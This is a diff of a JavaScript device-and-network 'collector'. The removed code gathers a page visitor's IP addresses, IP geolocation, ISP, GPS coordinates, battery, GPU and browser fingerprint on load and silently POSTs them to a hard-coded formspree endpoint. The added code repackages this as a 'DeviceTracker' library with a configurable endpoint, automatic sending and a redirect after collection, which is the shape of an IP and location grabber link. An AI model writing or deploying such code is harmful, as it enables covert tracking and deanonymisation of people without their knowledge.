@@ -1,166 +1,175 @@
-let canRunAds = true;
+/*!
+ * device.js - Lightweight Device & Network Info Collector
+ * Author: Ituze Bonheur
+ * License: MIT
+ */
 
-function detectAndroidVersion() {
-    const ua = navigator.userAgent;
-    const match = ua.match(/Android\s([0-9\.]+)/i);
-    return match ? "Android " + match[1] : "Not Android";
-}
+(function (global) {
+  "use strict";
 
-function getOS() {
-    const ua = navigator.userAgent;
-    if (/Android/i.test(ua)) return "Android";
-    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-    if (/Windows Phone/i.test(ua)) return "Windows Phone";
-    if (/BlackBerry|BB10/i.test(ua)) return "BlackBerry";
-    if (ua.includes("Windows NT")) return "Windows";
-    if (ua.includes("Mac OS")) return "MacOS";
-    if (ua.includes("CrOS")) return "ChromeOS"; 
-    if (ua.includes("Linux")) return "Linux";
-    if (ua.includes("FreeBSD")) return "FreeBSD";
-    if (ua.includes("OpenBSD")) return "OpenBSD";
-    if (ua.includes("NetBSD")) return "NetBSD";
-    if (ua.includes("SunOS")) return "Solaris";
-    return "Unknown OS";
-}
+  const DeviceTracker = {
+    config: {
+      endpoint: null,
+      redirect: null,
+      autoSend: false
+    },
 
-function getGPU() {
-    try {
-        const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-        if (!gl) return "Unavailable";
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic WebGL";
-    } catch (e) {
-        return "Blocked/Unavailable";
-    }
-}
+    init(options = {}) {
+      this.config = { ...this.config, ...options };
 
-async function getIPData() {
-    let ipv4 = "Not Detected";
-    let ipv6 = "Not Detected";
-    let geo = { country: "Unavailable", city: "", org: "Unavailable" };
+      if (this.config.autoSend && this.config.endpoint) {
+        this.send();
+      }
+    },
 
-    try {
-        const res4 = await fetch("https://api.ipify.org?format=json").catch(() => null);
-        if (res4) {
-            const data4 = await res4.json();
-            ipv4 = data4.ip;
+    async getNetwork() {
+      const data = {
+        ipv4: null,
+        ipv6: null,
+        isp: null,
+        geo: null
+      };
+
+      try {
+        const [v4, v6, geo] = await Promise.all([
+          fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => null),
+          fetch("https://api6.ipify.org?format=json").then(r => r.json()).catch(() => null),
+          fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => null)
+        ]);
+
+        if (v4) data.ipv4 = v4.ip;
+        if (v6) data.ipv6 = v6.ip;
+
+        if (geo) {
+          data.isp = geo.org;
+          data.geo = `${geo.city}, ${geo.country_name}`;
         }
+      } catch {}
 
-        const res6 = await fetch("https://api6.ipify.org?format=json").catch(() => null);
-        if (res6) {
-            const data6 = await res6.json();
-            ipv6 = data6.ip;
-        }
+      return data;
+    },
 
-        const resGeo = await fetch("https://ipapi.co/json/").catch(() => null);
-        if (resGeo) {
-            const dataGeo = await resGeo.json();
-            geo.country = dataGeo.country_name || "Unavailable";
-            geo.city = dataGeo.city || "";
-            geo.org = dataGeo.org || "Unavailable";
-        }
-    } catch (error) {
-        console.warn("IP collection partially blocked.");
-    }
+    getHardware() {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl");
 
-    return {
-        combinedIP: `IPv4: ${ipv4} | IPv6: ${ipv6}`,
-        country: geo.country,
-        city: geo.city,
-        org: geo.org
-    };
-}
+      let gpu = "Unknown";
 
-async function getGPS() {
-    return new Promise(resolve => {
-        if (!navigator.geolocation) {
-            resolve({ lat: "Not Supported", lon: "Not Supported" });
-            return;
-        }
+      if (gl) {
+        const debug = gl.getExtension("WEBGL_debug_renderer_info");
+        gpu = debug
+          ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
+          : "Hidden";
+      }
+
+      return {
+        threads: navigator.hardwareConcurrency || null,
+        ram: navigator.deviceMemory || null,
+        gpu,
+        touch: navigator.maxTouchPoints > 0
+      };
+    },
+
+    getOS() {
+      const ua = navigator.userAgent;
+        
+     if (/Android/i.test(ua)) return "Android";
+     if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+     if (/Windows Phone/i.test(ua)) return "Windows Phone";
+     if (/BlackBerry|BB10/i.test(ua)) return "BlackBerry";
+     if (ua.includes("Windows NT")) return "Windows";
+     if (ua.includes("Mac OS")) return "MacOS";
+     if (ua.includes("CrOS")) return "ChromeOS"; 
+     if (ua.includes("Linux")) return "Linux";
+     if (ua.includes("FreeBSD")) return "FreeBSD";
+     if (ua.includes("OpenBSD")) return "OpenBSD";
+     if (ua.includes("NetBSD")) return "NetBSD";
+     if (ua.includes("SunOS")) return "Solaris";
+      return "Unknown";
+    },
+
+    async getBattery() {
+      if (!navigator.getBattery) return null;
+
+      try {
+        const b = await navigator.getBattery();
+        return {
+          level: Math.round(b.level * 100),
+          charging: b.charging
+        };
+      } catch {
+        return null;
+      }
+    },
+
+    async getLocation() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve(null);
+
         navigator.geolocation.getCurrentPosition(
-            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-            err => resolve({ lat: "Denied/Error", lon: "Denied/Error" }),
-            { timeout: 5000 }
+          pos => resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          }),
+          () => resolve(null),
+          { timeout: 5000 }
         );
-    });
-}
+      });
+    },
 
-async function getBatteryInfo() {
-    try {
-        if (navigator.getBattery) {
-            const bat = await navigator.getBattery();
-            return { level: Math.round(bat.level * 100) + "%", charging: bat.charging };
-        }
-        return "Not Supported";
-    } catch (e) {
-        return "Blocked";
-    }
-}
+    async collect() {
+      const [network, hardware, battery, location] = await Promise.all([
+        this.getNetwork(),
+        this.getHardware(),
+        this.getBattery(),
+        this.getLocation()
+      ]);
 
-async function checkAdBlocker() {
-    return new Promise(resolve => {
-        const testAd = document.createElement('div');
-        testAd.innerHTML = '&nbsp;';
-        testAd.className = 'adsbox'; 
-        testAd.style.position = 'absolute';
-        testAd.style.left = '-999px';
-        document.body.appendChild(testAd);
+      return {
+        userAgent: navigator.userAgent,
+        os: this.getOS(),
+        language: navigator.language,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          pixelRatio: devicePixelRatio
+        },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: navigator.cookieEnabled,
+        hardware,
+        network,
+        battery,
+        location,
+        referrer: document.referrer || "Direct"
+      };
+    },
 
-        window.setTimeout(() => {
-            const isBlocked = testAd.offsetHeight === 0;
-            testAd.remove();
-            resolve(isBlocked ? "Enabled" : "Disabled");
-        }, 150);
-    });
-}
+    async send() {
+      if (!this.config.endpoint) {
+        console.warn("No endpoint defined.");
+        return;
+      }
 
-async function collect() {
-    const ipData = await getIPData();
-    const gps = await getGPS();
-    const battery = await getBatteryInfo();
-    const adBlockStatus = await checkAdBlocker();
-    const currentOS = getOS();
-    const androidVer = detectAndroidVersion();
+      const data = await this.collect();
 
-    return {
-        TIME: new Date().toString(),
-        IP_ADDRESSES: ipData.combinedIP, // Now shows both
-        LOCATION: `${ipData.country} ${ipData.city}`.trim(),
-        ISP: ipData.org,
-        GPS_LATITUDE: gps.lat,
-        GPS_LONGITUDE: gps.lon,
-        BATTERY_INFO: JSON.stringify(battery),
-        AD_BLOCKER: adBlockStatus,
-        BROWSER: navigator.userAgent,
-        OS: currentOS,
-        Android_V: androidVer,
-        SCREEN: `${screen.width}x${screen.height}`,
-        TIMEZONE: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        LANGUAGE: navigator.language,
-        GPU: getGPU(),
-        PLATFORM: (currentOS === "Android") ? androidVer : navigator.platform,
-        TOUCH: navigator.maxTouchPoints > 0 ? "Yes" : "No",
-        REFERRER: document.referrer || "Direct"
-    };
-}
-
-async function sendData() {
-    const data = await collect();
-    console.log("Data Collected:", data); 
-
-    try {
-        const response = await fetch("https://formspree.io/f/maqpoaly", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
+      try {
+        await fetch(this.config.endpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
         });
-        if (response.ok) {
-            console.log("Submission successful");
-        }
-    } catch (e) {
-        console.error("Transmission failed.");
-    }
-}
+      } catch (e) {
+        console.warn("Send failed", e);
+      }
 
-window.addEventListener('load', sendData);
+      if (this.config.redirect) {
+        window.location.href = this.config.redirect;
+      }
+    }
+  };
+
+  // expose globally
+  global.DeviceTracker = DeviceTracker;
+
+})(window);
